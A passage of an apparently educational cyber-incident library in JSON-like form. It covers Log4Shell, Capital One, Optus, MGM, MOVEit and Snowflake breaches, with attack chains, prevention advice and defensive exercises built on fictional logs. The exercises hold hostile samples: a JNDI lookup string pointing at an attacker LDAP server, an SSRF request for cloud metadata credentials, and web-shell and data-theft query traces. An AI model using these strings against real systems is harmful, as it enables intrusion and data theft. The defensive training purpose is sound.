as a JNDI lookup could make the server fetch and run code from an attacker-controlled LDAP server.",status:"confirmed"},{text:"Because apps often log things users type (usernames, headers, chat messages), an unauthenticated remote attacker could take control of an affected system just by getting a crafted string logged.",status:"confirmed"},{text:"CISA and partners responded to active, widespread exploitation.",status:"confirmed"}],initial_access:{text:"Exploitation of a public-facing application: attacker sends input that ends up in a Log4j log message, triggering a JNDI lookup to an attacker-controlled server (CVE-2021-44228).",status:"confirmed"},failure:[{text:"Unsafe default feature: JNDI message lookups did not protect against attacker-controlled LDAP and other JNDI endpoints.",status:"confirmed"},{text:"Many organisations did not know where Log4j was embedded in their software (including third-party and OT products).",status:"confirmed"}],attack_chain:[{step:1,stage:"Find input that gets logged",text:"Attacker sends a crafted lookup string in a form field, header or message.",status:"confirmed"},{step:2,stage:"Lookup triggered",text:"Log4j processes the lookup and contacts the attacker's LDAP/JNDI server.",status:"confirmed"},{step:3,stage:"Code execution",text:"Server loads and executes attacker-supplied code.",status:"confirmed"},{step:4,stage:"Follow-on",text:"Attackers could steal data, deploy ransomware or other malware.",status:"confirmed"}],impact:[{text:"Affected versions 2.0-beta9 through 2.14.1 (per CISA; NVD lists the range up to 2.15.0 excluding certain fixed releases) were used in consumer and enterprise services, websites, applications and OT products.",status:"confirmed"},{text:"Long tail: CISA advised continued scanning and remediation months later.",status:"confirmed"}],detection_investigation:[{text:"Log files of services using affected versions contain the user-controlled strings, so reviewing logs helps find exploitation attempts.",status:"confirmed"},{text:"CISA maintained a community GitHub list of affected products and pointed to CERT/CC file-system scanners.",status:"confirmed"}],response_recovery:[{text:"Upgrade Log4j; if not possible, apply temporary mitigations such as removing the JndiLookup class; if neither, consider removing the asset from the network.",status:"confirmed"},{text:"Vendors had to ship updated products; users had to apply vendor updates.",status:"confirmed"}],prevention:[{text:"Keep a software bill of materials (SBOM) so you know which libraries are inside each product.",basis:"Lesson from CISA guidance on asset scoping (editorial)"},{text:"Patch internet-facing systems first; track KEV catalog items.",basis:"CISA Log4j guidance (confirmed)"},{text:"Restrict outbound connections from servers (egress filtering) so lookups to unknown servers fail.",basis:"General defensive practice (editorial)"},{text:"Treat all user input as untrusted, even in logs.",basis:"Lesson from NVD description (editorial)"}],lessons:["A tiny piece of shared code can affect millions of systems.","Knowing what software you have is the first step to fixing it.","Even writing a log message can be risky if the library does extra work."],defensive_exercise:{title:"Find the lookup in the logs",scenario:"The fictional game server 'PixelPark' runs Java. You have a FICTIONAL extract of its web access log and outbound firewall log.",sample_data:["2030-06-10T11:00:01Z GET /login user-agent='Mozilla/5.0' status=200","2030-06-10T11:00:05Z GET /login user-agent='${jndi:ldap://203.0.113.50:1389/x}' status=200","2030-06-10T11:00:06Z FIREWALL outbound src=pixelpark-app dst=203.0.113.50 port=1389 action=ALLOW","2030-06-10T11:00:09Z FIREWALL outbound src=pixelpark-app dst=203.0.113.51 port=80 action=ALLOW","2030-06-10T11:02:00Z inventory pixelpark-app log4j-core=2.14.0"],tasks:["Which log line contains a suspicious lookup string?","What did the server do right after receiving it?","Is the Log4j version vulnerable?","Write two immediate actions and one long-term action."],expected_findings:["The second request's user-agent contains a ${jndi:ldap://...} lookup.","One second later the server connected out to 203.0.113.50:1389 (LDAP-style port), then to another host: signs of successful lookup and possible payload download.","2.14.0 is in the affected range.","Immediate: isolate the server, upgrade Log4j/apply vendor patch, block outbound to unknown hosts. Long-term: SBOM and egress filtering."]},kid_summary_urdu:"۲۰۲۱ میں ایک بہت عام کمپیوٹر کوڈ میں کمزوری ملی جو ہزاروں ویب سائٹس اور ایپس استعمال کرتی تھیں۔ دنیا بھر کے ماہرین نے مل کر جلدی سے اسے ٹھیک کرنے کے لیے اپ ڈیٹس بنائیں۔ اس سے سیکھتے ہیں کہ اپنے فون اور کمپیوٹر کی اپ ڈیٹس وقت پر کرنا اچھی بات ہے۔",unresolved:["The total number of systems compromised through Log4Shell is not known.","Minor difference: CISA lists affected versions as 2.0-beta9 to 2.14.1; NVD/Apache describe the range with fixed versions 2.3.1, 2.12.2 and 2.15.0. Both agree 2.0-beta9 through 2.14.1 are affected."],references:[{title:"Apache Log4j Vulnerability Guidance",url:"https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance",publisher:"CISA"},{title:"CVE-2021-44228 Detail",url:"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",publisher:"NIST NVD"},{title:"Log4j Security Vulnerabilities",url:"https://logging.apache.org/security.html",publisher:"Apache Logging Services"}]},{id:"capital-one-2019",name:"Capital One cloud data theft",date:"2019-07-19",organization:"Capital One",category:"cloud",secondary_categories:["web-app"],timeline:[{date:"2019-03-22/23",event:"An outside individual accesses and copies Capital One data stored in the cloud.",status:"company_statement"},{date:"2019-07-17",event:"An external security researcher reports a configuration vulnerability through Capital One's Responsible Disclosure Program.",status:"company_statement"},{date:"2019-07-19",event:"Capital One determines that data was taken.",status:"company_statement"},{date:"2019-07 (late)",event:"The FBI arrests the suspect after Capital One alerts it.",status:"confirmed"},{date:"2020-08",event:"US bank regulator OCC fines Capital One US$80 million (amount confirmed by DOJ; month from OCC news-release listing seen only in search results).",status:"reported"},{date:"2022-06-17",event:"A federal jury convicts former Seattle tech worker Paige Thompson of wire fraud and computer intrusion offences.",status:"confirmed"}],what_happened:[{text:"An outside individual gained unauthorized access to personal information of about 100 million people in the US and about 6 million in Canada, mostly credit-card application data from 2005 to early 2019.",status:"company_statement"},{text:"DOJ says the attacker built a tool to scan AWS for misconfigured accounts and used it to steal data from more than 30 entities and to mine cryptocurrency.",status:"confirmed"}],initial_access:{text:"Exploitation of a misconfiguration: reporting based on a source close to the investigation says a misconfigured web application firewall (ModSecurity) was tricked via server-side request forgery (SSRF) into fetching temporary cloud credentials from the AWS instance metadata service. Capital One itself describes it only as a 'configuration vulnerability'.",status:"reported"},failure:[{text:"Capital One's statement describes a configuration vulnerability.",status:"company_statement"},{text:"Per reporting, the firewall's cloud role had too many permissions (could list and read storage buckets).",status:"reported"},{text:"DOJ notes the OCC fined Capital One US$80 million; OCC cited risk-assessment failures before moving IT operations to the public cloud (OCC page not opened directly).",status:"confirmed"}],attack_chain:[{step:1,stage:"Scan",text:"Attacker's tool scanned for misconfigured cloud setups.",status:"confirmed"},{step:2,stage:"SSRF",text:"Crafted request made the firewall server query the cloud metadata service.",status:"reported"},{step:3,stage:"Credential theft",text:"Temporary role credentials returned to the attacker.",status:"reported"},{step:4,stage:"Data access",text:"Credentials used to list and copy files from storage.",status:"reported"},{step:5,stage:"Discovery by outsider",text:"An external security researcher reported the configuration vulnerability to Capital One.",status:"company_statement"}],impact:[{text:"About 140,000 US Social Security numbers, about 80,000 linked bank account numbers and about 1 million Canadian Social Insurance Numbers were taken; no credit card account numbers or log-in credentials.",status:"company_statement"},{text:"US$80 million regulatory fine and a US$190 million class settlement (per DOJ).",status:"confirmed"}],detection_investigation:[{text:"Discovered after an external researcher used Capital One's Responsible Disclosure Program, not by internal alerts.",status:"company_statement"},{text:"FBI identified and arrested the suspect; the government said it believed the data was recovered with no evidence of fraud use.",status:"company_statement"}],response_recovery:[{text:"Capital One fixed the issue, worked with law enforcement and notified affected customers.",status:"company_statement"},{text:"In January 2021 further analysis found about 4,700 more US SSNs; those people were notified and offered credit monitoring.",status:"company_statement"}],prevention:[{text:"Give cloud roles least privilege: a firewall should not be able to read every storage bucket.",basis:"Lesson from KrebsOnSecurity reporting (editorial)"},{text:"Block SSRF to metadata services (e.g., require session-token metadata access, filter internal addresses).",basis:"Lesson from KrebsOnSecurity reporting (editorial)"},{text:"Alert on unusual listing/downloading of storage buckets and on credentials used from outside the cloud.",basis:"Lesson from reporting; AWS GuardDuty mentioned by Amazon (reported)"},{text:"Run a vulnerability disclosure program; it was how this was found.",basis:"Company statement (company_statement)"}],lessons:["In the cloud, settings matter as much as code.","Give each tool only the access it really needs.","Listening to outside researchers can catch problems early."],defensive_exercise:{title:"Who is reading the buckets?",scenario:"At the fictional library service 'BookCloud', review these FICTIONAL cloud audit logs.",sample_data:["2030-07-01T01:00:00Z waf01 GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ (internal fetch)","2030-07-01T01:00:02Z role=waf01-role credentials_issued","2030-07-01T01:05:00Z role=waf01-role ListBuckets src_ip=198.51.100.99 (outside company)","2030-07-01T01:05:30Z role=waf01-role GetObject bucket=member-applications count=700","policy waf01-role: s3:ListAllMyBuckets, s3:GetObject on *"],tasks:["Why would a web firewall fetch the metadata credentials path?","What is unusual about where the role is used next?","What is wrong with the role policy?","Suggest three fixes."],expected_findings:["This matches SSRF: the firewall was tricked into fetching its own credentials.","The role's credentials are used from an outside IP and read 700 objects: data theft pattern.","Policy allows reading every bucket ('*'): far more than a firewall needs.","Rotate credentials, restrict the policy to needed resources, harden metadata access, alert on role use from outside IPs."]},kid_summary_urdu:"۲۰۱۹ میں ایک بینک نے اپنی معلومات کلاؤڈ میں رکھی تھیں، مگر ایک سیٹنگ ٹھیک نہیں تھی جس سے ایک شخص نے بہت سا ڈیٹا کاپی کر لیا۔ ایک نیک دل محقق نے بینک کو بتایا اور پولیس نے اس شخص کو پکڑ لیا۔ اس سے سیکھتے ہیں کہ ہر سسٹم کو صرف اتنی اجازت دیں جتنی ضرورت ہو۔",unresolved:["Capital One has not published a detailed technical root cause; the SSRF/WAF explanation comes from press reporting citing a source.","OCC enforcement documents were not opened directly for this library (fine amount confirmed via DOJ)."],references:[{title:"Information on the Capital One Cyber Incident (facts2019)",url:"https://www.capitalone.com/digital/facts2019/",publisher:"Capital One"},{title:"Former Seattle Tech Worker Convicted of Wire Fraud and Computer Intrusions",url:"https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions",publisher:"US Department of Justice (WDWA)"},{title:"What We Can Learn from the Capital One Hack",url:"https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/",publisher:"KrebsOnSecurity"}]},{id:"optus-2022",name:"Optus customer data breach via exposed API",date:"2022-09-22",organization:"Optus (Singtel Optus Pty Ltd)",category:"api",timeline:[{date:"c. 2018",event:"ACMA alleges a coding error weakened an access control about four years before the breach and went undetected.",status:"reported"},{date:"c. 2020-2022",event:"ACMA alleges Optus fixed the error on one domain but left another domain dormant and vulnerable for about two years.",status:"reported"},{date:"2022-09-17 to 2022-09-20",event:"Attacker accesses customer data through the vulnerable API (dates per ACMA filing).",status:"reported"},{date:"2022-09-21",event:"Vulnerable endpoint taken offline (per iTnews, citing ACMA filing).",status:"reported"},{date:"2022-09-22",event:"Optus publicly notifies customers of a cyberattack; works with the Australian Cyber Security Centre and Australian Federal Police.",status:"company_statement"},{date:"2024-06-20",event:"Optus confirms the attack exploited a vulnerability from a 'historical coding error'; ACMA court documents released.",status:"company_statement"}],what_happened:[{text:"An attacker accessed personal information of current and former Optus customers: names, dates of birth, phone numbers, emails and, for some, addresses and ID document numbers (driver's licence, passport).",status:"company_statement"},{text:"Optus says the attacker exploited a previously unknown vulnerability from a historical coding error, mimicking usual customer activity and rotating through tens of thousands of IP addresses.",status:"company_statement"},{text:"ACMA alleges an internet-facing API on a dormant domain had an access-control weakness, and that more than 9.5 million former and current customers' information was accessed.",status:"reported"}],initial_access:{text:"Abuse of an internet-facing API whose access control had been weakened by a coding error (per ACMA allegations, accepted in substance by Optus as a 'historical coding error'). Optus says other authentication and detection controls were bypassed.",status:"company_statement"},failure:[{text:"A coding error weakened an access control; it was fixed on one domain but not another (ACMA allegation).",status:"reported"},{text:"A dormant domain stayed online for about two years though not needed (ACMA allegation).",status:"reported"},{text:"ACMA says the attack 'was not highly sophisticated' and was done by trial and error; Optus disputes aspects and intends to defend the case.",status:"unresolved"}],attack_chain:[{step:1,stage:"Discover",text:"Attacker finds an exposed API endpoint on a dormant domain.",status:"reported"},{step:2,stage:"Bypass access control",text:"Weak access control lets requests return customer records.",status:"reported"},{step:3,stage:"Evade detection",text:"Requests mimic normal customer activity and rotate through tens of thousands of IPs.",status:"company_statement"},{step:4,stage:"Bulk collection",text:"Records for millions of customers collected over several days.",status:"reported"},{step:5,stage:"Leak",text:"Identity information of about 10,200 customers released on the dark web.",status:"company_statement"}],impact:[{text:"About 10,200 customers' identity information was published on the dark web; no card, bank or password data affected.",status:"company_statement"},{text:"ACMA: 3,154,171 active subscribers had physical addresses accessed and 2,470,036 had identity information accessed.",status:"reported"},{text:"Optus reimbursed costs of replacing identity documents and offered credit monitoring.",status:"company_statement"}],detection_investigation:[{text:"Optus says it shut down the attack upon discovering it and notified authorities.",status:"company_statement"},{text:"Deloitte conducted a forensic review; the report became the subject of legal disputes over confidentiality.",status:"company_statement"}],response_recovery:[{text:"Endpoint taken offline; Optus addressed the vulnerability and reviewed systems and processes.",status:"company_statement"},{text:"Customers told Optus would not send links in emails/SMS about the incident, to reduce scam risk.",status:"company_statement"}],prevention:[{text:"Inventory all APIs and domains; decommission unused ones.",basis:"Lesson from ACMA allegations (editorial)"},{text:"Test authorization on every endpoint (prevent broken object-level authorization); apply fixes everywhere the same code runs.",basis:"Lesson from ACMA allegations (editorial)"},{text:"Rate-limit and alert on high-volume record access even when spread across many IPs.",basis:"Lesson from Optus statement on IP rotation (editorial)"},{text:"Collect and keep only the identity data you truly need.",basis:"General privacy practice (editorial)"}],lessons:["Forgotten websites and APIs are still doors.","Fix a bug everywhere, not just in one place.","Lots of small, normal-looking requests can add up to a big leak."],defensive_exercise:{title:"The API that answered too much",scenario:"The fictional phone company 'TalkTown' has an old customer API. Look at this FICTIONAL API log.",sample_data:["2030-08-17T10:00:01Z GET /old-api/v1/customer?id=100001 auth=none src=203.0.113.1 status=200","2030-08-17T10:00:02Z GET /old-api/v1/customer?id=100002 auth=none src=203.0.113.2 status=200","2030-08-17T10:00:03Z GET /old-api/v1/customer?id=100003 auth=none src=203.0.113.3 status=200","2030-08-17T10:00:04Z GET /api/v2/customer?id=100004 auth=none src=203.0.113.4 status=401","summary 2030-08-17: /old-api requests=1,200,000 unique_src_ips=40,000 auth=none"],tasks:["What pattern do you see in the customer IDs?","Compare /old-api and /api/v2 responses without authentication.","Why might rate-limiting per IP fail here?","What should TalkTown do first?"],expected_findings:["IDs go up by one each request: enumeration.","The old API returns data (200) without auth; the new API correctly refuses (401): the fix was not applied to the old endpoint.","Requests come from 40,000 different IPs, so per-IP limits are easily avoided; total-volume alerts are needed.","Take /old-api offline, check logs for scope, notify affected customers and regulators."]},kid_summary_urdu:"۲۰۲۲ میں آسٹریلیا کی ایک فون کمپنی کے ایک پرانے آن لائن دروازے میں غلطی رہ گئی تھی، جس سے کسی نے بہت سے صارفین کی معلومات دیکھ لیں۔ کمپنی نے دروازہ بند کیا اور لوگوں کی مدد کی تاکہ وہ محفوظ رہیں۔ اس سے سیکھتے ہیں کہ جو چیز استعمال میں نہ ہو اسے بند کر دینا چاہیے۔",unresolved:["Several technical details (timing of the coding error, the partial fix, endpoint takedown date) are ACMA allegations in court; Optus intends to defend the case.","Who carried out the attack has not been confirmed in the opened sources.","Deloitte report contents are not public in full."],references:[{title:"Optus notifies customers of cyberattack compromising customer information (2022-09-22)",url:"https://www.optus.com.au/about/media-centre/media-releases/2022/09/optus-notifies-customers-of-cyberattack",publisher:"Optus"},{title:"Optus statement on commencement of ACMA Federal Court proceedings (2024-06-20)",url:"https://www.optus.com.au/about/media-centre/media-releases/2024/06/optus-statement-on-commencement-of-acma-federal-court-proceedings",publisher:"Optus"},{title:"Optus cyber attack could have been prevented four years prior, says telecoms watchdog",url:"https://www.abc.net.au/news/2024-06-20/optus-hack/104002682",publisher:"ABC News (Australia)"},{title:"Optus breach allegedly enabled by access control coding error",url:"https://www.itnews.com.au/news/optus-breach-allegedly-enabled-by-access-control-coding-error-608985",publisher:"iTnews"}]},{id:"mgm-resorts-2023",name:"MGM Resorts cyberattack",date:"2023-09-11",organization:"MGM Resorts International",category:"identity",secondary_categories:["ransomware"],timeline:[{date:"2023-09-11",event:"An unauthorized third party obtains personal information of some MGM customers.",status:"company_statement"},{date:"2023-09-11/12",event:"MGM reports a 'cybersecurity issue' and shuts down systems to protect data, disrupting operations at some properties.",status:"company_statement"},{date:"2023-09 (mid)",event:"Reports say Scattered Spider / ALPHV (BlackCat) were involved and that entry began by tricking the IT help desk.",status:"reported"},{date:"2023-09-20",event:"MGM says its hotels and casinos are operating normally (per Vox).",status:"reported"},{date:"2023-09-29",event:"MGM determines customer personal information was obtained.",status:"company_statement"},{date:"2023-10-05",event:"MGM files an 8-K estimating about US$100M negative impact and announces customer notification.",status:"company_statement"}],what_happened:[{text:"MGM identified a cybersecurity issue affecting certain US systems and shut systems down to protect customer data, which disrupted some properties.",status:"company_statement"},{text:"Criminals obtained personal data (name, contact information, gender, date of birth, driver's licence number; for a limited number, SSN or passport number) for some customers who transacted before March 2019.",status:"company_statement"},{text:"Media reports, citing people familiar with the matter, said the attackers socially engineered MGM's IT help desk, and that Scattered Spider and ALPHV/BlackCat were involved.",status:"reported"}],initial_access:{text:"Reported: social engineering of the IT help desk (impersonating an employee, reportedly using information found on LinkedIn) to gain access/credentials. MGM has not publicly confirmed the method.",status:"reported"},failure:[{text:"Reported: help desk identity verification could be defeated by a convincing phone caller.",status:"reported"},{text:"CISA notes Scattered Spider commonly convinces help desks to reset passwords and transfer MFA, and recommends phishing-resistant MFA.",status:"confirmed"}],attack_chain:[{step:1,stage:"Reconnaissance",text:"Gather employee details from public sources such as social media (typical Scattered Spider technique).",status:"confirmed"},{step:2,stage:"Vishing the help desk",text:"Call help desk pretending to be an employee to get a password/MFA reset (reported for MGM).",status:"reported"},{step:3,stage:"Identity takeover",text:"Use the account in the single sign-on environment; register own MFA (typical technique per CISA).",status:"confirmed"},{step:4,stage:"Data theft and ransomware",text:"Steal customer data; ALPHV-linked actors claimed encryption of systems.",status:"reported"}],impact:[{text:"About US$100 million negative impact to Adjusted Property EBITDAR; under US$10 million in one-time costs; September occupancy 88% vs 93% a year earlier.",status:"company_statement"},{text:"Guests faced disruptions; virtually all guest-facing systems were restored by early October.",status:"company_statement"},{text:"MGM said it did not believe passwords, bank account numbers or payment card data were affected.",status:"company_statement"}],detection_investigation:[{text:"MGM launched an investigation with leading cybersecurity experts and coordinated with law enforcement.",status:"company_statement"}],response_recovery:[{text:"Shut down systems promptly, restored systems over the following weeks, added safeguards.",status:"company_statement"},{text:"Notified affected customers by email and offered free credit monitoring and identity protection; set up a call centre.",status:"company_statement"}],prevention:[{text:"Use strict caller verification at help desks (call-back to known number, manager approval) before resetting passwords or MFA.",basis:"CISA AA23-320A guidance (confirmed)"},{text:"Adopt phishing-resistant MFA (FIDO/WebAuthn) that cannot simply be reset or SIM-swapped.",basis:"CISA AA23-320A (confirmed)"},{text:"Alert on new MFA device registrations and admin role changes; allowlist approved remote-access tools.",basis:"CISA AA23-320A (confirmed)"}],lessons:["Attackers may 'hack' people, not computers.","Help desks need a safe way to check who is really calling.","Shutting systems down quickly can limit harm, even if it is inconvenient."],defensive_exercise:{title:"Is the caller really who they say?",scenario:"You work at the fictional 'SunnyStay Hotels' help desk. Review this FICTIONAL ticket history and identity log.",sample_data:["2030-09-11T09:02 ticket#551 caller='A. Rivera (IT Admin)' request='lost phone, reset MFA' verified_by=answered_name_and_title","2030-09-11T09:05 MFA reset for a.rivera completed by helpdesk-agent-3","2030-09-11T09:07 new MFA device registered for a.rivera device=unknown-android","2030-09-11T09:20 a.rivera added to group 'SSO-SuperAdmins'","HR record: A. Rivera on vacation 2030-09-08 to 2030-09-15, phone on file +00-000-FAKE"],tasks:["How was the caller 'verified'? Is that enough?","List the suspicious events in order.","What does the HR record suggest?","Write a better help-desk verification rule."],expected_findings:["Only name and job title, which anyone can find online: not enough.","MFA reset -> unknown device registered -> admin group added within 18 minutes.","The real employee was on vacation; the caller was likely an impersonator.","Example: call back the number on file and require manager approval for MFA resets on privileged accounts."]},kid_summary_urdu:"۲۰۲۳ میں ایک بڑی ہوٹل کمپنی کے کمپیوٹر سسٹم میں کچھ لوگ داخل ہو گئے، اور خبروں کے مطابق انہوں نے فون پر کسی ملازم کی نقل کر کے مدد مانگی تھی۔ کمپنی نے حفاظت کے لیے سسٹم کچھ دن بند رکھے اور پھر بحال کیے۔ اس سے سیکھتے ہیں کہ فون پر کوئی بھی خود کو کچھ بھی بتا سکتا ہے، اس لیے تصدیق ضروری ہے۔",unresolved:["MGM has not publicly confirmed the help-desk social-engineering entry method; it comes from media reports citing sources.","Whether a ransom was paid by MGM is not confirmed by MGM in the opened sources (Vox reported MGM refused to engage).","Number of affected customers not stated in opened MGM sources."],references:[{title:"MGM Resorts International Form 8-K (2023-10-05)",url:"https://www.sec.gov/Archives/edgar/data/789570/000119312523251667/d461062d8k.htm",publisher:"US SEC / MGM Resorts"},{title:"MGM Resorts Update on Recent Cybersecurity Issue (2023-10-05)",url:"https://investors.mgmresorts.com/2023-10-05-MGM-RESORTS-UPDATE-ON-RECENT-CYBERSECURITY-ISSUE",publisher:"MGM Resorts"},{title:"Scattered Spider (AA23-320A)",url:"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a",publisher:"CISA / FBI and partners"},{title:"The chaotic and cinematic MGM casino hack, explained",url:"https://www.vox.com/technology/2023/9/15/23875113/mgm-hack-casino-vishing-cybersecurity-ransomware",publisher:"Vox"}]},{id:"moveit-transfer-cve-2023-34362",name:"MOVEit Transfer mass data theft (CVE-2023-34362)",date:"2023-05-27",organization:"Progress Software MOVEit Transfer and many customer organisations",category:"supply-chain",secondary_categories:["web-app","ransomware"],timeline:[{date:"2023-05-27",event:"CL0P ransomware gang (TA505) begins exploiting an unknown SQL injection flaw in MOVEit Transfer, per CISA/FBI.",status:"confirmed"},{date:"2023-06-02",event:"CISA adds CVE-2023-34362 to the Known Exploited Vulnerabilities catalog.",status:"confirmed"},{date:"2023-06-07",event:"CISA and FBI publish joint advisory AA23-158A with indicators and mitigations.",status:"confirmed"}],what_happened:[{text:"CL0P exploited a zero-day SQL injection vulnerability (CVE-2023-34362) in internet-facing MOVEit Transfer web applications.",status:"confirmed"},{text:"They installed a web shell named LEMURLOOT (often as human2.aspx, imitating the legitimate human.aspx) and used it to steal data from the underlying databases.",status:"confirmed"},{text:"Stolen data was used for extortion of many organisations that used MOVEit Transfer.",status:"confirmed"}],initial_access:{text:"Exploitation of a zero-day SQL injection vulnerability in a public-facing MOVEit Transfer web application.",status:"confirmed"},failure:[{text:"An unknown flaw in widely deployed file-transfer software exposed every internet-facing instance at once.",status:"confirmed"},{text:"The vulnerable web application gave access to the server's underlying database and stored files, so exploitation exposed whatever data organisations kept there.",status:"confirmed"}],attack_chain:[{step:1,stage:"Exploit",text:"SQL injection against the MOVEit Transfer web app.",status:"confirmed"},{step:2,stage:"Web shell",text:"LEMURLOOT web shell (human2.aspx) installed; requests use header X-siLock-Comment as a password.",status:"confirmed"},{step:3,stage:"Persistence",text:"Web shell can create an admin account named 'Health Check Service'.",status:"confirmed"},{step:4,stage:"Exfiltration",text:"Files and database contents downloaded.",status:"confirmed"},{step:5,stage:"Extortion",text:"Victims threatened with publication of stolen data.",status:"confirmed"}],impact:[{text:"Large numbers of organisations worldwide were affected; CISA describes it as a widespread campaign.",status:"confirmed"}],detection_investigation:[{text:"CISA advised hunting for human2.aspx, the X-siLock-Comment header, unexpected 'Health Check Service' accounts, and SQL queries with Permission=30.",status:"confirmed"}],response_recovery:[{text:"Apply vendor patches; if compromise suspected, rebuild servers. CISA warned that rebuilding with the old database intact keeps attacker-created accounts.",status:"confirmed"}],prevention:[{text:"Patch internet-facing file-transfer tools quickly and track the KEV catalog.",basis:"CISA AA23-158A (confirmed)"},{text:"Delete files from transfer servers once delivered; do not use them as long-term storage.",basis:"General defensive practice (editorial)"},{text:"Monitor web servers for new .aspx files and new admin accounts.",basis:"CISA AA23-158A (confirmed)"}],lessons:["One bug in one popular tool can affect thousands of organisations.","Watching for new, unexpected files helps catch intruders.","Data that is not kept cannot be stolen."],defensive_exercise:{title:"The extra file in the web folder",scenario:"The fictional company 'ParcelPost' runs a file-transfer server. Review this FICTIONAL file listing and web log.",sample_data:["wwwroot/human.aspx   created=2029-01-10","wwwroot/human2.aspx  created=2030-05-28T03:12Z","2030-05-28T03:15Z POST /human2.aspx header X-Fake-Comment=Zx81... status=200","2030-05-28T03:16Z db: new user 'Health Check Service' role=admin","2030-05-28T03:20Z outbound bytes=4.2GB dst=198.51.100.200"],tasks:["Which file looks out of place and why?","What happened in the database after the POST request?","What does the outbound transfer suggest?","List four response steps."],expected_findings:["human2.aspx is new and imitates the legitimate human.aspx: likely a web shell.","A new admin account was created: attacker persistence.","4.2GB sent to an unknown IP: data exfiltration.","Isolate server, patch, remove web shell and rogue account, rebuild cleanly, review what data was stored, notify affected parties."]},kid_summary_urdu:"۲۰۲۳ میں فائلیں بھیجنے والے ایک مشہور سافٹ ویئر میں ایک پوشیدہ کمزوری تھی جسے ایک گروہ نے استعمال کیا۔ حکومتی ماہرین نے سب کو خبردار کیا اور کمپنیوں نے اپ ڈیٹس لگائیں۔ اس سے سیکھتے ہیں کہ غیر ضروری فائلیں پرانی جگہوں پر چھوڑ کر نہیں رکھنی چاہئیں۔",unresolved:["Total number of affected organisations and individuals was not taken from an opened primary source for this library.","Progress Software's own advisory was not opened for this entry; technical details rely on CISA/FBI."],references:[{title:"#StopRansomware: CL0P Ransomware Gang Exploits CVE-2023-34362 MOVEit Vulnerability (AA23-158A)",url:"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a",publisher:"CISA / FBI"}]},{id:"snowflake-unc5537-2024",name:"Snowflake customer data theft campaign (UNC5537)",date:"2024-04",organization:"Customers of Snowflake (cloud data platform)",category:"cloud",secondary_categories:["identity"],timeline:[{date:"2020-11 onward",event:"Some credentials later used were first stolen by infostealer malware as early as November 2020.",status:"researcher_finding"},{date:"2024-04",event:"Mandiant first observes UNC5537 activity against Snowflake customer instances.",status:"researcher_finding"},{date:"2024-05-22",event:"Mandiant notifies Snowflake.",status:"researcher_finding"},{date:"2024-05-30",event:"Snowflake publishes guidance for customers.",status:"researcher_finding"},{date:"2024-06-10",event:"Mandiant publishes its UNC5537 analysis; about 165 potentially exposed organisations notified.",status:"researcher_finding"},{date:"2026-08-05",event:"DOJ: Connor Moucka pleads guilty to a hacking conspiracy using stolen credentials against at least 165 customers of a US SaaS company (Feb–Oct 2024).",status:"confirmed"}],what_happened:[{text:"A financially motivated group (UNC5537) logged into Snowflake customer accounts using usernames and passwords stolen earlier by infostealer malware, then stole data and extorted victims.",status:"researcher_finding"},{text:"Mandiant found no evidence that Snowflake's own enterprise environment was breached; the problem was customer accounts without MFA.",status:"researcher_finding"},{text:"DOJ says conspirators stole billions of records, received over US$2.5 million in ransom, and caused victim losses over US$9.5 million, affecting at least 100 million individuals.",status:"confirmed"}],initial_access:{text:"Use of valid customer credentials stolen by infostealer malware (e.g., VIDAR, RISEPRO, REDLINE, RACOON, LUMMA, METASTEALER), often from contractor computers also used for personal activities.",status:"researcher_finding"},failure:[{text:"Affected accounts did not have MFA enabled.",status:"researcher_finding"},{text:"Credentials had not been rotated for years in some cases (79.7% of accounts had prior credential exposure).",status:"researcher_finding"},{text:"No network allow-lists restricted where logins could come from.",status:"researcher_finding"}],attack_chain:[{step:1,stage:"Credential theft",text:"Infostealer malware on employee/contractor devices captures saved Snowflake credentials.",status:"researcher_finding"},{step:2,stage:"Login",text:"Attacker logs in from VPN/hosting IPs using the stolen credentials (no MFA).",status:"researcher_finding"},{step:3,stage:"Reconnaissance",text:"Runs queries such as SHOW TABLES to find data.",status:"researcher_finding"},{step:4,stage:"Staging and theft",text:"CREATE TEMPORARY STAGE, COPY INTO compressed files, GET to download.",status:"researcher_finding"},{step:5,stage:"Extortion",text:"Victims threatened; data advertised for sale on criminal forums.",status:"confirmed"}],impact:[{text:"At least 165 customer organisations compromised (DOJ); billions of records including call/text metadata, financial data and identity numbers.",status:"confirmed"}],detection_investigation:[{text:"Mandiant identified the campaign through incident response and notified Snowflake and potentially affected organisations.",status:"researcher_finding"},{text:"FBI investigation with international partners led to arrest of a suspect about six months after the breaches began and extradition from Canada in July 2025.",status:"confirmed"}],response_recovery:[{text:"Snowflake published guidance; Mandiant recommended enabling MFA, rotating credentials and setting network allow-lists.",status:"researcher_finding"}],prevention:[{text:"Require MFA on every cloud data account; enforce it centrally.",basis:"Mandiant UNC5537 report (researcher_finding)"},{text:"Rotate credentials regularly and immediately after any malware infection.",basis:"Mandiant UNC5537 report (researcher_finding)"},{text:"Restrict logins to trusted networks (allow-lists).",basis:"Mandiant UNC5537 report (researcher_finding)"},{text:"Separate work and personal use on devices that hold admin credentials.",basis:"Lesson from Mandiant finding on contractor devices (editorial)"}],lessons:["A password stolen years ago can still be used today if it never changes.","MFA would have stopped most of these logins.","Your security depends on settings you choose, not only on the provider."],defensive_exercise:{title:"Old password, new login",scenario:"The fictional sports league 'GoalData' stores stats in a cloud warehouse. Review these FICTIONAL login and query logs.",sample_data:["user=analyst_kim mfa=disabled password_last_changed=2026-01-15","2030-04-12T01:03Z login user=analyst_kim src_ip=192.0.2.88 (VPN provider) client=generic-sql-tool result=success","2030-04-12T01:04Z query user=analyst_kim 'SHOW TABLES'","2030-04-12T01:06Z query user=analyst_kim 'CREATE TEMPORARY STAGE tmp_x'","2030-04-12T01:07Z query user=analyst_kim 'COPY INTO @tmp_x FROM players_private'","2030-04-12T01:09Z query user=analyst_kim 'GET @tmp_x'","threat_intel: analyst_kim credentials seen in an infostealer log dated 2028-11"],tasks:["List three risk factors for analyst_kim's account.","What does the query sequence show?","What would have blocked this login?"],expected_findings:["MFA disabled, password unchanged for years, credentials previously stolen by infostealer.","Discovery (SHOW TABLES) -> staging (CREATE STAGE, COPY INTO) -> download (GET): data theft.","MFA, network 